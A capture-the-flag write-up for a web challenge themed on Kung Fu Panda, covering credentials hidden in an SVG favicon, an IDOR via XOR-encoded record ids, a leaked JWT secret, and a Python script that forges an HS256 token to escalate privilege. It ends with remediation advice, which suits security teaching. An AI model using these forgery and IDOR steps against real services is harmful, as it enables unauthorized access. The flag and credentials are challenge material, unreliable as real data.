# The Dragon Warrior — KPMG CTF (Web, 20 pts)

> *"You are Po. Master Shifu doesn't think you're ready. Master Oogway, as usual, seems unbothered by that. Explore the Jade Palace, earn your dragon seal, and find out what the scroll has been hiding."*
>
> Note: after deploying, the instance can take ~30 seconds to come online.

| | |
|---|---|
| **Target** | `http://kicyber-546e757ab467-the-dragon-warrior-0-0.chals.io` (redirects to `https://`) |
| **Category** | Web |
| **Flag** | `KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}` |
| **Vulnerabilities** | Hidden credentials in a static asset · IDOR via a reversible "cipher" key · JWT secret disclosure in chat content · JWT forgery / privilege escalation |

---

## TL;DR — the kill chain

1. **Hidden credentials** in `favicon.svg`'s SVG comment → login `po : skadoosh1`.
2. **Training file** `/api/training/lesson/1a0e` leaks a home-made "Jade Cipher" (raw XOR) with key `jade-cipher-77`.
3. The lesson id is just `XOR(name)`: `XOR("po") = 1a0e`. Encrypting other names (an **IDOR**) reveals **Master Shifu's restricted file**, which states the seal is an **HS256 JWT** claiming rank `dragon-warrior` and that the flag lives at `/scroll`.
4. **Master Oogway's chat** leaks the JWT signing phrase (hex): `49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42` — the secret is the *literal hex string*.
5. **Forge** a seal JWT with `"rank":"dragon-warrior"`, `POST /api/dragon-seal/certify`, then `GET /api/scroll` → **flag**.

```
FLAG: KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}
```

---

## 1. Reconnaissance

The root returns a React SPA (`openresty` in front). The HTML had a teasing comment:
> *"There is nothing hidden on this page, disciple. Master Oogway never makes it that easy. Look elsewhere; the palace has more than one door."*

```console
$ curl -sI http://kicyber-546e757ab467-the-dragon-warrior-0-0.chals.io
HTTP/1.1 301 Moved Permanently
Server: openresty/1.27.1.2
Location: https://kicyber-546e757ab467-the-dragon-warrior-0-0.chals.io/
```

Downloading the bundle and grepping for routes/endpoints exposed the API surface:

```console
$ grep -oE '"/[a-zA-Z0-9_./-]+"' assets/index-BIpxLhGm.js | sort -u
"/api"
"/auth/login"  "/auth/logout"  "/auth/me"
"/dragon-seal/certify"  "/dragon-seal/mine"
"/oogway"  "/shifu"  "/scroll"  "/scroll/"
"/training"  "/warriors"  "/profile"  "/login"
```

The client (`hi()` in the bundle) prefixes everything with `/api` and sends cookies. The *Dragon Scroll* page (`/scroll`) is only rendered for `rank === "dragon-warrior"` and fetches `/api/scroll` for the flag.

**"More than one door" = the static assets.** The favicon is an SVG, and SVG supports comments.

---

## 2. Door #1 — credentials hidden in `favicon.svg`

```console
$ curl -s https://.../favicon.svg
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <!--
    "There are no accidents," said Master Oogway.

    Po, if you are reading this: you already have a name and a room in the
    palace. You just haven't found the key yet.

      disciple: po
      key: skadoosh1

    Present these at the gate. ...
  -->
  ...
</svg>
```

Login:

```console
$ curl -s -c cookies.txt -X POST https://.../api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"po","password":"skadoosh1"}'
{"message":"Welcome back, Disciple.","rank":"trainee"}
```

We are now `po`, rank **trainee**.

---

## 3. Door #2 — the Training Hall & the Jade Cipher

`GET /api/oogway` opened with a nudge:
> *"You found something written beneath your own name... A key does not care whose door it opens — only that it fits. I wonder whose other names might fit it."*

`GET /api/shifu`:
> *"The Training Hall does not lie. It merely waits for you to look properly."*

The UI's default training file is `/training/1a0e`. Fetching it via the API — note the endpoint is `/api/training/lesson/{ref}` — returned Po's file **including source code for a "Jade Cipher"**:

```json
{"title":"Basic Trainee File","notes":"PALACE TRAINING RECORDS -- DISCIPLE FILE\n...\n\ndef decrypt(token: str, key: bytes = b\"jade-cipher-77\") -> str:\n    data = bytes.fromhex(token)\n    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode()\n\ndef encrypt(text: str, key: bytes = b\"jade-cipher-77\") -> str:\n    ..."}
```

The cipher is a plain repeating-key XOR with key `jade-cipher-77`.

**The insight:** the lesson id is `1a0e`. XOR it back with the key:

```
0x1a ^ 0x6a = 0x70 = 'p'
0x0e ^ 0x61 = 0x6f = 'o'
```

So `ref = XOR(username, "jade-cipher-77")`, i.e. **the lesson URL is just an encoded username**. The ref is a deterministic, reversible identifier with **no authorization check** → an **IDOR** that can be iterated over *any* name.

```python
def jade_enc(text):                 # refs are lowercase
    return bytes(b ^ key[i % len(key)]
                 for i, b in enumerate(text.encode())).hex()

jade_enc("po")  -> "1a0e"           # matches the built-in file
```

Encrypting other names:

| Name | Ref | Result |
|---|---|---|
| `po` | `1a0e` | Basic Trainee File |
| `shifu` | `19090d0358` | **Dragon Warrior Certification (RESTRICTED)** |
| `tigress` | `1e08031748101a` | Furious Five Training File |
| `monkey` | `070e0a0e481a` | Furious Five Training File |
| `oogway`, `crane`, ... | — | not found |

```console
$ curl -s -b cookies.txt https://.../api/training/lesson/19090d0358
```

**Master Shifu's restricted record:**

```
MASTER SHIFU -- PRIVATE TRAINING RECORD
"Dragon Warrior Certification"

Candidates are authenticated through the Jade Palace Dragon Seal.
Seal algorithm: HS256.
The signing phrase is not written here, nor anywhere a disciple is meant to read.
Master Oogway alone has been known to speak of it, and only to those who have
already proven they know how to look.
Required rank claim for chamber access: dragon-warrior.
The chamber keeps no entry in the palace hall's directory. It answers only at
its own door -- /scroll -- and opens solely to one bearing a seal the palace
recognizes.
```

We now know exactly what to build: an **HS256 JWT** with `"rank":"dragon-warrior"`, presented at `/api/dragon-seal/certify`, unlocking `/api/scroll`.

---

## 4. Door #3 — the signing phrase from Master Oogway

The seal returned by `/api/dragon-seal/mine` is a JWT (HS256):

```json
{"alg":"HS256","typ":"JWT"}
{"sub":"47c0798f-71bf-4486-a6c3-a6fb315ecff8","rank":"trainee",
 "iat":1791688118,"exp":1791688718,"iss":"jade-palace"}
```

After the Training Hall was "looked at properly", Oogway's wisdom grew a third line:

> *"A seal is only as secret as the phrase behind it. Should such a phrase ever slip from these old lips, it would sound something like: `49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42`"*

Trying to Jade-decode that hex yields garbage — that's the point: **the signing phrase is literally the hex string itself**, not the XOR-decoded bytes. This was confirmed against the real token with HMAC-SHA256:

```python
hmac.new(b"49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42",
         signing_input, sha256).digest() == real_signature   # -> True
```

---

## 5. Forging the Dragon Seal and opening the scroll

Build the JWT with the *same* `sub`, add `rank: dragon-warrior`, and sign with the leaked phrase:

```python
import base64, hmac, hashlib, time, json
SECRET = b"49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42"

def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
now = int(time.time())
h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
p = b64(json.dumps({"sub": SUB, "rank": "dragon-warrior",
                    "iat": now, "exp": now+86400, "iss": "jade-palace"},
                   separators=(",",":")).encode())
sig = b64(hmac.new(SECRET, (h+"."+p).encode(), hashlib.sha256).digest())
seal = f"{h}.{p}.{sig}"
```

Present it — the palace verifies the signature and (incorrectly) trusts the `rank` claim:

```console
$ curl -s -b cookies.txt -X POST https://.../api/dragon-seal/certify \
    -H 'Content-Type: application/json' -d "{\"seal\":\"$SEAL\"}"
{"message":"Master Shifu has recognized your Dragon Seal.",
 "rank":"dragon-warrior","dragon_scroll_chamber":"open"}

$ curl -s -b cookies.txt https://.../api/auth/me
{"username":"po","rank":"dragon-warrior","name":"Po"}

$ curl -s -b cookies.txt https://.../api/scroll
{"flag":"KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}"}
```

> Note: `certify` rotates the session cookie. Read **and** write the cookie jar (`-b -c`) so the upgraded `dragon-warrior` session is preserved.

### 🚩 Flag

```
KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}
```

---

## 6. Vulnerability analysis / root causes

| # | Issue | Impact |
|---|---|---|
| 1 | **Secrets in static assets** — credentials in an SVG comment (`favicon.svg`) | Authentication bypass / initial access |
| 2 | **IDOR on `/api/training/lesson/{ref}`** — the ref is just `XOR(name)` (reversible), and any name can be queried | Read other users'/staff's private files, including a restricted certification record |
| 3 | **Home-made "cryptography"** — repeating-key XOR (`jade-cipher-77`) with a hard-coded key shipped in a public file | Trivially decryptable; used here as the IDOR key |
| 4 | **JWT secret disclosure in application content** — the HS256 signing phrase is served in Oogway's chat as a hex string | Full token forgery |
| 5 | **Trusting a client-controlled `rank` claim** — privilege escalation is decided by the JWT's `rank` field, which a forged token controls | Any user → `dragon-warrior` → flag / protected area |

The theme is consistent: **every "lock" in this challenge is a value shipped to the client or derivable from one.** Nothing is protected by server-side authorization — only by obfuscation.

## 7. Remediation

- **Never** put credentials, keys, or flags in static/client-served files (SVGs, JS, source maps, comments, favicons).
- Replace reversible "identifiers" with server-side authorization: look up the record by the *authenticated* user, and check ownership/role before returning it. A ref must not be a client-computable encoding of a name.
- Don't ship encryption/obfuscation keys to the client. Repeatable-XOR is not encryption; use vetted crypto and keep all keys server-side.
- Keep the JWT signing secret in a server-side secret store, rotate it, and never emit it in responses/logs/chat.
- Derive privilege from server state, not from a token claim the client can influence; re-check authorization on every sensitive endpoint (`/scroll`, `/certify`).

---

## 8. Appendix — artifacts & reproduction

Everything from the run is stored in this folder.

```
KPMG/
├── The-Dragon-Warrior-Writeup.md          # this file
└── dragon_warrior/
    ├── README.md                          # copy of this writeup
    ├── assets/
    │   ├── index-BIpxLhGm.js              # minified React bundle
    │   ├── index-B_2yws4c.css             # stylesheet
    │   ├── favicon.svg                    # <-- credentials here
    │   └── pretty.js                      # beautified bundle used for analysis
    ├── scripts/
    │   └── solve.py                       # end-to-end automated solve
    └── evidence/
        ├── flag.txt
        ├── solve_output.txt
        ├── index.html
        ├── favicon.svg
        ├── index-BIpxLhGm.js
        ├── login.json
        ├── auth-me.json
        ├── dragon-seal-mine.json          # the trainee JWT seal
        ├── training-lesson-1a0e.json      # Jade Cipher leak
        ├── training-lesson-1a0e.notes.txt
        ├── training-lesson-shifu.json     # restricted certification file
        ├── training-lesson-shifu.notes.txt
        ├── oogway.json / oogway.wisdom.txt# signing-phrase leak
        └── warriors.json
```

### One-shot reproduction

```console
$ python3 dragon_warrior/scripts/solve.py
...
FLAG: KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}
```

### Useful raw commands

```bash
# login
curl -s -c cookies.txt -X POST https://.../api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"po","password":"skadoosh1"}'

# Jade-cipher helper (Python)
python3 -c 'k=b"jade-cipher-77";f=lambda s:bytes(b^k[i%len(k)] for i,b in enumerate(s.encode())).hex();print(f("shifu"))'
# -> 19090d0358

# IDOR read of Shifu's restricted record
curl -s -b cookies.txt https://.../api/training/lesson/19090d0358

# Oogway signing-phrase leak
curl -s -b cookies.txt https://.../api/oogway

# flag (after certifying a forged dragon-warrior seal)
curl -s -b cookies.txt https://.../api/scroll
```

### Timeline of doors

| Door | Location | What it gave |
|---|---|---|
| Static SVG comment | `favicon.svg` | `po : skadoosh1` |
| Training Hall IDOR | `/api/training/lesson/XOR(name)` | Jade Cipher key + restricted spec |
| Oogway chat | `/api/oogway` | JWT signing phrase |
| Dragon Seal forgery | `/api/dragon-seal/certify` | `rank: dragon-warrior` |
| Dragon Scroll | `/api/scroll` | 🚩 flag |
